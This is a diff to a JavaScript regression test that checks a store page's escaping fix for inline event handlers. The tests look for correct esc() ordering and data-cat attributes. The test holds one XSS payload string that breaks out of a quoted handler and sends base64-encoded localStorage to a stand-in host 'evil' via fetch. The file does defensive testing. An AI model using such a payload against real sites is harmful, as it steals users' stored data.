@@ -12,9 +12,9 @@ const hits = walk(root).filter((f) => /\.(html|js)$/.test(f))
   .flatMap((f) => fs.readFileSync(f, 'utf8').split('\n').map((l, i) => wrongOrder.test(l) ? path.relative(root, f) + ':' + (i + 1) : null).filter(Boolean));
 t('no esc(x).replace(/\'/g, …) inside an inline handler (quote escaped AFTER esc)', hits.length === 0, hits.join(', '));
 const store = fs.readFileSync(path.join(root, 'store.html'), 'utf8');
-t('store.html chips carry data-cat and no setCat( handler string', /data-cat="' \+ esc\(c\)/.test(store) && !/onclick="setCat\(/.test(store));
+t('store.html chips carry data-cat and no setCat( handler string', /data-cat="' \+ esc\(\w+\)/.test(store) && !/onclick="setCat\(/.test(store));
 t('store.html reads the chip back through one click listener', /getElementById\('cats'\)\.addEventListener\('click'/.test(store));
-const esc = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[^\n]*/)[0] + '; return esc;')();
+const esc = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + '; return esc;')();
 const payload = "x');fetch('//evil/?'+btoa(JSON.stringify(localStorage)));//";
 t('the review\'s payload stays inside a data-cat attribute (no raw quote survives esc)', !/['"<>]/.test(esc(payload).replace(/&#39;|&quot;|&lt;|&gt;|&amp;/g, '')));
 process.exit(fail ? 1 : 0);
